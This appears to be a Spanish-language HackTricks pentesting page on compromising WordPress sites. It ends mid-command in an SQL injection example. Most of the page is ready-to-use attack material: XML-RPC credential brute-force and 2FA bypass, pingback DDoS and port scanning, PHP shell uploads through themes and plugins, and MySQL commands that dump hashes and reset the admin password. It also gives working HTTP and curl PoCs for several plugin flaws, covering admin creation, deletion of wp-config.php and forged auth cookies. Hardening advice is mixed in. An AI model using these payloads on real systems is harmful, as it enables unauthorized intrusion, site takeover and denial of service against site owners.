# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Información básica

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Los archivos de temas se pueden encontrar en /wp-content/themes/,** así que si modificas algún php del theme para obtener RCE probablemente usarás esa ruta. Por ejemplo: Usando **theme twentytwelve** puedes **acceder** al archivo **404.php** en: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Otra URL útil podría ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- En **wp-config.php** puedes encontrar la contraseña root de la base de datos.
- Rutas de login por defecto a comprobar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principales archivos de WordPress**

- `index.php`
- `license.txt` contiene información útil como la versión de WordPress instalada.
- `wp-activate.php` se usa para el proceso de activación por email al configurar un nuevo sitio WordPress.
- Carpetas de login (pueden ser renombradas para ocultarlas):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` es un archivo que representa una característica de WordPress que permite que los datos se transmitan usando HTTP como mecanismo de transporte y XML como mecanismo de codificación. Este tipo de comunicación ha sido reemplazado por la [REST API](https://developer.wordpress.org/rest-api/reference) de WordPress.
- La carpeta `wp-content` es el directorio principal donde se almacenan plugins y temas.
- `wp-content/uploads/` es el directorio donde se almacenan los archivos subidos a la plataforma.
- `wp-includes/` es el directorio donde se almacenan los archivos core, como certificados, fuentes, archivos JavaScript y widgets.
- `wp-sitemap.xml` en versiones de WordPress 5.5 o superiores, WordPress genera un archivo sitemap XML con todas las entradas públicas y los tipos de post y taxonomías públicamente consultables.

**Post exploitation**

- El archivo `wp-config.php` contiene la información que WordPress necesita para conectarse a la base de datos, como el nombre de la base de datos, host de la base de datos, usuario y contraseña, claves de autenticación y salts, y el prefijo de las tablas de la base de datos. Este archivo de configuración también puede usarse para activar el modo DEBUG, lo cual puede ser útil para troubleshooting.

### Permisos de usuarios

- **Administrador**
- **Editor**: Publica y gestiona sus propios posts y los de otros
- **Autor**: Publica y gestiona sus propios posts
- **Colaborador**: Escribe y gestiona sus posts pero no puede publicarlos
- **Suscriptor**: Navega posts y edita su perfil

## **Enumeración pasiva**

### **Obtener la versión de WordPress**

Comprueba si puedes encontrar los archivos `/license.txt` o `/readme.html`

Dentro del **código fuente** de la página (ejemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Archivos de enlace CSS

![](<../../images/image (533).png>)

- Archivos JavaScript

![](<../../images/image (524).png>)

### Obtener Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtener temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraer versiones en general
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeración activa

### Plugins y Temas

Probablemente no podrás encontrar todos los plugins y temas posibles. Para descubrirlos todos, necesitarás **Brute Force activamente una lista de plugins y temas** (esperemos que existan herramientas automatizadas que contengan estas listas).

### Usuarios

- **ID Brute:** Obtienes usuarios válidos de un sitio WordPress mediante Brute Forcing de los IDs de usuario:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si las respuestas son **200** o **30X**, eso significa que el id es **válido**. Si la respuesta es **400**, entonces el id es **inválido**.

- **wp-json:** También puedes intentar obtener información sobre los usuarios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Otro endpoint `/wp-json/` que puede revelar alguna información sobre usuarios es:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Solo se proporcionará información sobre los usuarios que tienen esta función habilitada**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Al iniciar sesión en **`/wp-login.php`** el **mensaje** es **diferente** dependiendo de si el **nombre de usuario** existe o no.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (Puedes automatizar este proceso [using this](https://github.com/relarizky/wpxploit) por ejemplo).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**Comprobar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce de credenciales**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** son algunos de los métodos que se pueden usar para realizar brute-force de credenciales. Si puedes encontrar alguno de ellos, puedes enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
El mensaje _"Incorrect username or password"_ dentro de una respuesta con código 200 debería aparecer si las credenciales no son válidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando las credenciales correctas puedes subir un archivo. En la respuesta aparecerá la ruta ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este método está pensado para programas y no para humanos, y es antiguo; por lo tanto no soporta 2FA. Así que, si tienes creds válidas pero la entrada principal está protegida por 2FA, **puedes abusar de xmlrpc.php para hacer login con esas creds saltándote la 2FA**. Ten en cuenta que no podrás realizar todas las acciones que puedes hacer a través de la consola, pero aún así podrías llegar a RCE como Ippsec lo explica en [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si obtienes **faultCode** con un valor **mayor** que **0** (17), significa que el puerto está abierto.

Echa un vistazo al uso de **`system.multicall`** en la sección anterior para aprender cómo abusar de este método y provocar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este archivo normalmente existe en la raíz del sitio de Wordpress: **`/wp-cron.php`**\
Cuando se **accede** a este archivo se ejecuta una "**pesada**" **consulta** MySQL, por lo que podría ser usada por **atacantes** para **causar** un **DoS**.\
Además, por defecto, el `wp-cron.php` se invoca en cada carga de página (cada vez que un cliente solicita cualquier página de Wordpress), lo que en sitios de alto tráfico puede causar problemas (DoS).

Se recomienda desactivar Wp-Cron y crear un cronjob real en el host que ejecute las acciones necesarias a intervalos regulares (sin causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Prueba a acceder a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ y el sitio Worpress puede realizar una solicitud hacia ti.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta herramienta comprueba si existe **methodName: pingback.ping** y la ruta **/wp-json/oembed/1.0/proxy**, y si existen, intenta explotarlas.

## Herramientas automáticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtener acceso sobrescribiendo un bit

Más que un ataque real, esto es una curiosidad. En el CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) podías voltear 1 bit de cualquier archivo de wordpress. Así que podías voltear la posición `5389` del archivo `/var/www/html/wp-includes/user.php` para convertir en NOP la operación NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modificar un php del tema usado (se necesitan credenciales de admin)**

Apariencia → Editor de temas → Plantilla 404 (a la derecha)

Cambia el contenido por un shell php:

![](<../../images/image (384).png>)

Busca en internet cómo puedes acceder a esa página actualizada. En este caso tienes que acceder aquí: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puedes usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obtener una sesión.

## RCE en plugins

### Plugin PHP

Puede ser posible subir archivos .php como un plugin.\
Crea tu backdoor php usando por ejemplo:

![](<../../images/image (183).png>)

Luego añade un nuevo plugin:

![](<../../images/image (722).png>)

Sube el plugin y presiona Install Now:

![](<../../images/image (249).png>)

Haz clic en Procced:

![](<../../images/image (70).png>)

Probablemente aparentemente esto no hará nada, pero si vas a Media, verás tu shell subido:

![](<../../images/image (462).png>)

Accede a él y verás la URL para ejecutar el reverse shell:

![](<../../images/image (1006).png>)

### Subir y activar un plugin malicioso

Este método implica la instalación de un plugin malicioso conocido por ser vulnerable y que puede explotarse para obtener un web shell. Este proceso se realiza a través del dashboard de WordPress de la siguiente manera:

1. **Adquisición del plugin**: El plugin se obtiene de una fuente como Exploit DB, por ejemplo [**here**](https://www.exploit-db.com/exploits/36374).
2. **Instalación del plugin**:
- Navega al dashboard de WordPress, luego ve a `Dashboard > Plugins > Upload Plugin`.
- Sube el archivo zip del plugin descargado.
3. **Activación del plugin**: Una vez que el plugin se instala correctamente, debe activarse desde el dashboard.
4. **Explotación**:
- Con el plugin "reflex-gallery" instalado y activado, puede explotarse ya que es conocido por ser vulnerable.
- El framework Metasploit proporciona un exploit para esta vulnerabilidad. Cargando el módulo correspondiente y ejecutando comandos específicos, puede establecerse una meterpreter session, otorgando acceso no autorizado al sitio.
- Se señala que este es solo uno de los muchos métodos para explotar un sitio WordPress.

El contenido incluye ayudas visuales que muestran los pasos en el dashboard de WordPress para instalar y activar el plugin. Sin embargo, es importante señalar que explotar vulnerabilidades de esta manera es ilegal y poco ético sin la autorización adecuada. Esta información debe usarse de forma responsable y solo en un contexto legal, como pentesting con permiso explícito.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS a RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ es un script diseñado para escalar una vulnerabilidad de **Cross-Site Scripting (XSS)** a **Remote Code Execution (RCE)** u otras vulnerabilidades críticas en WordPress. Para más información revisa [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Proporciona **soporte para WordPress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crea un usuario en WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Sube tu plugin personalizado (backdoor) a WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita un Built-In Plugins en WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita un Built-In Themes en WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personalizados para plugins/temas de terceros de WordPress.

## Post Exploitation

Extraer nombres de usuario y contraseñas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiar admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superficie de ataque

Saber cómo un Wordpress plugin puede exponer funcionalidad es clave para encontrar vulnerabilidades en dicha funcionalidad. Puedes ver cómo un plugin podría exponer funcionalidad en los siguientes puntos y algunos ejemplos de plugins vulnerables en [**esta entrada del blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Una de las formas en que un plugin puede exponer funciones a los usuarios es a través de manejadores AJAX. Estos pueden contener errores de lógica, autorización o autenticación. Además, es bastante frecuente que estas funciones basen tanto la autenticación como la autorización en la existencia de un wordpress nonce que **cualquier usuario autenticado en la instancia de Wordpress podría tener** (independientemente de su rol).

Estas son las funciones que pueden usarse para exponer una función en un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**El uso de `nopriv` hace que el endpoint sea accesible por cualquier usuario (incluso usuarios no autenticados).**

> [!CAUTION]
> Además, si la función solo verifica la autorización del usuario con la función `wp_verify_nonce`, esa función únicamente comprueba que el usuario está autenticado; normalmente no comprueba el rol del usuario. Por tanto, usuarios con pocos privilegios podrían tener acceso a acciones de alto privilegio.

- **REST API**

También es posible exponer funciones de wordpress registrando una REST API usando la función `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
El `permission_callback` es un callback a una función que comprueba si un usuario dado está autorizado a llamar al método de la API.

**Si se usa la función integrada `__return_true`, simplemente omitirá la comprobación de permisos del usuario.**

- **Acceso directo al archivo php**

Por supuesto, Wordpress usa PHP y los archivos dentro de los plugins son accesibles directamente desde la web. Así que, si un plugin expone alguna funcionalidad vulnerable que se dispara simplemente accediendo al archivo, será explotable por cualquier usuario.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Algunos plugins implementan atajos de "trusted header" para integraciones internas o reverse proxies y luego usan ese header para establecer el contexto del usuario actual en las peticiones REST. Si el header no está vinculado criptográficamente a la solicitud por un componente upstream, un atacante puede falsificarlo y acceder a rutas REST privilegiadas como administrador.

- Impacto: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Ejemplo de header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Ruta explotada: `POST /wp-json/wp/v2/users` con un array de rol elevado.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por qué funciona

- El plugin asigna un header controlado por el cliente al estado de autenticación y omite las comprobaciones de capacidades.
- WordPress core espera la capacidad `create_users` para esta ruta; el hack del plugin la elude estableciendo directamente el contexto del usuario actual desde el header.

Indicadores de éxito esperados

- HTTP 201 con un body JSON que describe el usuario creado.
- Un nuevo usuario admin visible en `wp-admin/users.php`.

Lista de comprobación de detección

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, o vendor SDKs que leen headers personalizados para establecer el contexto del usuario (p. ej., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisar REST registrations en busca de callbacks privilegiados que carezcan de comprobaciones `permission_callback` robustas y en su lugar dependan de headers de la petición.
- Buscar usos de funciones core de gestión de usuarios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que estén protegidos únicamente por valores de headers.

Mitigaciones

- Nunca derives autenticación o autorización de headers controlados por el cliente.
- Si un reverse proxy debe inyectar identidad, termina la confianza en el proxy y elimina las copias entrantes (p. ej., `unset X-Wcpay-Platform-Checkout-User` en el borde), luego pasa un token firmado y verifícalo en el servidor.
- Para rutas REST que realizan acciones privilegiadas, requiere comprobaciones `current_user_can()` y un `permission_callback` estricto (NO uses `__return_true`).
- Prefiere auth de primera parte (cookies, application passwords, OAuth) sobre la “impersonation” vía headers.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introducidos por este fragmento:

* **Acceso no autenticado** – se registra el hook `wp_ajax_nopriv_`.
* **Sin verificación de nonce / capability** – cualquier visitante puede acceder al endpoint.
* **Sin sanitización de rutas** – la cadena controlada por el usuario `fontfamily` se concatena a una ruta del sistema de archivos sin filtrado, permitiendo el clásico `../../` traversal.

#### Explotación

Un atacante puede eliminar cualquier archivo o directorio **por debajo del directorio base uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando una única solicitud HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Porque `wp-config.php` se encuentra fuera de *uploads*, cuatro secuencias `../` son suficientes en una instalación por defecto. Eliminar `wp-config.php` obliga a WordPress a entrar en el *asistente de instalación* en la siguiente visita, permitiendo la toma total del sitio (el atacante simplemente proporciona una nueva configuración de DB y crea un usuario admin).

Otros objetivos impactantes incluyen archivos `.php` de plugin/theme (para romper security plugins) o reglas de `.htaccess`.

#### Detection checklist

* Cualquier callback `add_action( 'wp_ajax_nopriv_...')` que llame a helpers del sistema de archivos (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenación de entrada de usuario no saneada en rutas (buscar `$_POST`, `$_GET`, `$_REQUEST`).
* Ausencia de `check_ajax_referer()` y `current_user_can()`/`is_user_logged_in()`.

#### Endurecimiento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Siempre** trate cualquier operación de escritura/eliminación en disco como privilegiada y verifique doblemente:
> • Autenticación  • Autorización  • Nonce  • Saneamiento de entradas  • Contención de rutas (p. ej. vía `realpath()` más `str_starts_with()`).
 
---

### Escalada de privilegios mediante restauración de roles obsoletos y falta de autorización (ASE "View Admin as Role")

Muchos plugins implementan una función de "view as role" o cambio temporal de rol guardando el/los rol(es) originales en user meta para poder restaurarlos más tarde. Si la ruta de restauración se basa únicamente en parámetros de la petición (p. ej., `$_REQUEST['reset-for']`) y en una lista mantenida por el plugin sin comprobar capacidades y un nonce válido, esto se convierte en una escalada vertical de privilegios.

Un ejemplo real se encontró en el plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). La rama de reset restauraba roles basándose en `reset-for=<username>` si el nombre de usuario aparecía en un array interno `$options['viewing_admin_as_role_are']`, pero no realizaba ni una comprobación `current_user_can()` ni una verificación de nonce antes de eliminar los roles actuales y volver a añadir los roles guardados en user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por qué es explotable

- Confía en `$_REQUEST['reset-for']` y en una opción del plugin sin autorización del lado del servidor.
- Si un usuario previamente tenía privilegios más altos guardados en `_asenha_view_admin_as_original_roles` y fue degradado, puede restaurarlos accediendo a la ruta de reset.
- En algunas implementaciones, cualquier usuario autenticado podría desencadenar un reset para otro nombre de usuario aún presente en `viewing_admin_as_role_are` (autorización rota).

Requisitos previos del ataque

- Versión vulnerable del plugin con la función habilitada.
- La cuenta objetivo tiene un rol de alto privilegio obsoleto almacenado en user meta por uso anterior.
- Cualquier sesión autenticada; falta nonce/capability en el flujo de reset.

Explotación (ejemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
En versiones vulnerables esto elimina los roles actuales y vuelve a añadir los roles originales guardados (p. ej., `administrator`), escalando privilegios efectivamente.

Detection checklist

- Buscar funciones de cambio de rol que persistan “original roles” en user meta (p. ej., `_asenha_view_admin_as_original_roles`).
- Identificar rutas de reset/restore que:
- Leer nombres de usuario desde `$_REQUEST` / `$_GET` / `$_POST`.
- Modificar roles vía `add_role()` / `remove_role()` sin `current_user_can()` y `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizar basándose en un arreglo de opciones del plugin (p. ej., `viewing_admin_as_role_are`) en lugar de las capacidades del actor.

Hardening

- Exigir comprobaciones de capacidades en cada rama que modifique el estado (p. ej., `current_user_can('manage_options')` o más estricta).
- Requerir nonces para todas las mutaciones de roles/permisos y verificarlas: `check_admin_referer()` / `wp_verify_nonce()`.
- Nunca confiar en nombres de usuario proporcionados por la solicitud; resolver el usuario objetivo del lado servidor en función del actor autenticado y de una política explícita.
- Invalidar el estado de “original roles” en actualizaciones de perfil/rol para evitar restauraciones obsoletas de altos privilegios:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Considere almacenar el mínimo estado y usar tokens limitados en el tiempo y protegidos por capability para cambios temporales de rol.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Algunos plugins enlazan user-switching helpers al hook público `init` y derivan la identidad de una cookie controlada por el cliente. Si el código llama a `wp_set_auth_cookie()` sin verificar autenticación, capability y un nonce válido, cualquier visitante no autenticado puede forzar el inicio de sesión como un ID de usuario arbitrario.

Patrón típico vulnerable (simplificado de Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por qué es explotable

- El hook público `init` hace que el manejador sea accesible para usuarios sin autenticar (sin protección `is_user_logged_in()`).
- La identidad se deriva de una cookie modificable por el cliente (`original_user_id`).
- La llamada directa a `wp_set_auth_cookie($uid)` autentica al solicitante como ese usuario sin ninguna comprobación de capabilities/nonce.

Explotación (sin autenticar)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Consideraciones de WAF para CVEs de WordPress/plugins

Los WAFs genéricos en el edge/servidor están afinados para patrones amplios (SQLi, XSS, LFI). Muchas vulnerabilidades de alto impacto en WordPress/plugins son fallos de lógica/autenticación específicos de la aplicación que parecen tráfico benigno a menos que el motor entienda las rutas de WordPress y la semántica de los plugins.

Offensive notes

- Apunta a endpoints específicos del plugin con payloads limpios: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Prueba primero las rutas no autenticadas (AJAX `nopriv`, REST con `permission_callback` permisivo, shortcodes públicos). Los payloads por defecto suelen tener éxito sin ofuscación.
- Casos típicos de alto impacto: escalada de privilegios (broken access control), carga/descarga arbitraria de archivos, LFI, open redirect.

Defensive notes

- No confíes en firmas genéricas de WAF para proteger CVEs de plugins. Implementa parches virtuales a nivel de aplicación específicos para la vulnerabilidad o actualiza rápidamente.
- Prefiere comprobaciones de seguridad de lista blanca en el código (capabilities, nonces, validación estricta de entradas) en lugar de filtros negativos basados en regex.

## Protección de WordPress

### Actualizaciones regulares

Asegúrate de que WordPress, los plugins y los temas estén actualizados. También confirma que la actualización automática esté habilitada en wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Además, **solo instala plugins y temas de WordPress confiables**.

### Plugins de seguridad

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Otras recomendaciones**

- Elimina el usuario por defecto **admin**
- Usa **contraseñas seguras** y **2FA**
- Revisa periódicamente los **permisos** de los usuarios
- Limita los **intentos de inicio de sesión** para prevenir ataques de Brute Force
- Renombra el archivo **`wp-admin.php`** y permite el acceso solo internamente o desde ciertas direcciones IP.


### SQL Injection no autenticada por validación insuficiente (WP Job Portal <= 2.3.2)

El plugin de reclutamiento WP Job Portal expuso una tarea **savecategory** que finalmente ejecuta el siguiente código vulnerable dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introducidos por este fragmento:

1. **Entrada de usuario no saneada** – `parentid` proviene directamente de la petición HTTP.
2. **Concatenación de cadenas dentro de la cláusula WHERE** – no hay `is_numeric()` / `esc_sql()` / prepared statement.
3. **Accesibilidad sin autenticación** – aunque la acción se ejecuta a través de `admin-post.php`, la única verificación en su lugar es un **CSRF nonce** (`wp_verify_nonce()`), que cualquier visitante puede recuperar desde una página pública que incruste el shortcode `[wpjobportal_my_resumes]`.

#### Explotación

1. Obtener un nonce nuevo:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inyectar SQL arbitrario abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
